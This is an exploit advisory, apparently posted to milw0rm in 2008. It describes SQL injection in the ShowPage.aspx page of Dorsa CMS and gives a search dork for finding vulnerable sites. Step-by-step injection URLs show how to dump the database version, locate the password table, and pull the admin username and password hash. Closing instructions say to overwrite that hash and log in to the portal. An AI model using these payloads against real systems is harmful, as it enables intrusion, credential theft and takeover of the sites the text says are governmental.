@@ -1,0 +1,52 @@
+#########################################################
+---------------------------------------------------------
+
+Portal Name: Dorsa CMS
+Vendor : http://www.dorsacms.com
+Description : A CMS written by iranian programmers which uses by governmental websites.
+Vulnerable File : ShowPage.aspx
+Dork: Powered by DorsaCms
+Author : syst3m_f4ult  && Y!ID : autumn_love6
+
+---------------------------------------------------------
+#########################################################
+
+How to exploit :
+
+a live example :
+
+http://www.xxx.ir/ShowPage.aspx?page_=news&lang=1&tempname=fire&sub=0&PageID=36&PageIDF=2
+
+Testing injection :
+http://www.xxx.ir/ShowPage.aspx?page_=news&lang=1&tempname=fire&sub=0&PageID=36&PageIDF=2 or 1=convert(int,@@version)--
+	Microsoft SQL Server 2000 - 8.00.194 (Intel X86) Aug 6 2000 00:57:48 Copyright (c) 1988-2000 Microsoft Corporation Enterprise ...
+
+Getting table which contains Username and Password:
+Easiest way is to search it:
+
+http://www.xxx.ir/ShowPage.aspx?page_=news&lang=1&tempname=fire&sub=0&PageID=36&PageIDF=2 or 1=convert(int,(select top 1 table_name from information_schema.columns where column_name like %27%pass%%27))--
+
+	table_name = Seller
+Its not that table we are seeking, so we keep on:
+http://www.xxx.ir/ShowPage.aspx?page_=news&lang=1&tempname=fire&sub=0&PageID=36&PageIDF=2 or 1=convert(int,(select top 1 table_name from information_schema.columns where column_name like %27%pass%%27 and table_name not in ('Seller')))--
+
+Bingo
+	Table_name = USER_
+
+Start to get username and pass from USER_:
+
+http://www.xxx.ir/ShowPage.aspx?page_=news&lang=1&tempname=fire&sub=0&PageID=36&PageIDF=2 or 1=convert(int,(select top 1 %2b'Username= '%2bconvert(varchar,isnull(convert(varchar,user_name),'NULL'))%2b' -- Password= : '%2bconvert(varchar,isnull(convert(varchar,Pass),'NULL')) from USER_ where Code='1'))
+
+	user : admin
+	pass : kaBY/8jRC+XbjSIIDhsHFmOX1B2pDd
+
+Update hash to a hash you know its decode and enjoy.
+
+login to portal :
+http://www.xxx.ir/Dorsapax/Signin.aspx
+
+
+---------------------------------------------------------
+#########################################################
+
+# milw0rm.com [2008-10-22]
